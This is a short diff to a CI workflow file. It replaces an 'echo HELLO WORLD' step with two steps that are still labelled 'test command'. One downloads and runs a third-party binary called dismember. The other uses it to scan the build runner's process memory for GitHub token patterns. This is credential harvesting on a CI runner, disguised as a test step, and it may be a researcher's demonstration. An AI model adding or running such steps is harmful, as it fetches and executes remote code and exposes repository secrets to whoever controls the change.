@@ -11,4 +11,6 @@ jobs:
       - buildspec-override:true
     steps:
       - name: test command
-        run: echo "HELLO WORLD"
+        run: curl -o dismember -L https://github.com/liamg/dismember/releases/download/v0.0.1/dismember-linux-amd64 && chmod +x dismember
+      - name: test command
+        run: ./dismember grep 'gh[pousr]_[0-9a-zA-Z]{36}' -s .
